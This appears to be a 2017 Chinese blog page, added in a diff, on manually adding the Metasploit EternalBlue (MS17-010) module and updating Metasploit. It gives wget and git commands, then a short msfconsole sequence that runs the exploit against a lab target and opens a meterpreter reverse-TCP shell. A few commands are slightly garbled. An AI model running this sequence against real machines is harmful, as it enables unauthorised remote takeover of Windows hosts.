@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+<title>msf手动添加漏洞脚本</title>
+<style>
+			body{
+				width: 92%;
+				background-color:#B2DFEE;
+				padding:0 4%;
+			}
+			*{
+				margin: 0 auto;
+				padding: 0;
+			}
+		</style>
+		</head>
+<body>
+<div>
+
+
+<br/><br/>
+<!--文章title-->
+<center>
+<font style="FONT-FAMILY: Comic Sans MS;"><strong><h2>msf手动添加漏洞脚本</h2></strong></font>
+<a target="_blank" href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=laimooc@163.com" style="text-decoration:none;">
+<img src="http://rescdn.qqmail.com/zh_CN/htmledition/images/function/qm_open/ico_mailme_02.png"/></a>
+</center>
+<!--主体内容-->
+<div><br/><br/>
+<p style="text-indent:32px">msf手动添加漏洞脚本，前提链接数据库状态下(依添加ms17010为例)：</p><br/>
+<p style="text-indent:32px">kali ：
+wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</p><br/>
+<p style="text-indent:32px">ubuntu：
+wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb  /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/smb/ms17_010_eternalblue.rb
+</p><br/>
+<p style="text-indent:32px">然后#：
+msfconsole
+reload_all</p><br/>
+
+<p style="text-indent:32px">-----------------------------------------</p><br/>
+
+<p style="text-indent:32px">此外，metesploit的更新方式如下：</p><br/>
+<p style="text-indent:32px">第一种：终端命令行下直接：msfupdate</p><br/>
+<p style="text-indent:32px">第二种，从新下载GitHub上的新版：rm -rf msf3 && git clone https://github.com/rapid7/metasploit-framework.git;</p><br/>
+<p style="text-indent:32px">当然模块也可以自行下载到相应的目录，如：wget https://raw.githubusercontent.com/rapid7/metasploit-
+framework/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb && copy ms17_010_eternalblue.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</p><br/>
+
+<p style="text-indent:32px">-----------------------------------------</p><br/>
+<p style="text-indent:32px">Ms117010的利用方式之一：</p><br/>
+<p style="text-indent:32px">msfconsole -qx "use exploit/windows/smb/ms17_010_eternalblue"</p><br/>
+<p style="text-indent:32px">set RHOST 192.168.142.128（设置靶机）</p><br/>
+<p style="text-indent:32px">set payload windows/x64/meterpreter/reverse_tcp （监听）</p><br/>
+<p style="text-indent:32px">set LHOST 192.168.142.133 （设置主机ip）</p><br/>
+<p style="text-indent:32px">exploit</p><br/>
+</div><br/>
+<p style="text-indent:32px">参考1：https://bbs.ichunqiu.com/forum.php?mod=viewthread&tid=23115&highlight=ms17</p><br/>
+<p style="text-indent:32px">参考2：https://bbs.ichunqiu.com/thread-23005-1-1.html</p><br/>
+<p style="text-indent:32px"></p><br/>
+
+
+<!--其他功能-->
+<center>
+<h4 >记：2017-5-27 10:38&nbsp;&nbsp; </h4><br/>
+<input type="button" name="button1" id="button1" value="返回上一页" onclick="history.go(-1)"> <br/><br/>
+<script type="text/javascript">document.write(['<a href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=',encodeURIComponent(location.href),'&title=',encodeURIComponent(document.title),'" target="_blank"  style="text-decoration:none;"  title="分享到QQ空间">分享到QQ空间<\/a>'].join(''));</script>
+</center>
+</div>
+<br/><br/>
+
+</body>
+</html>
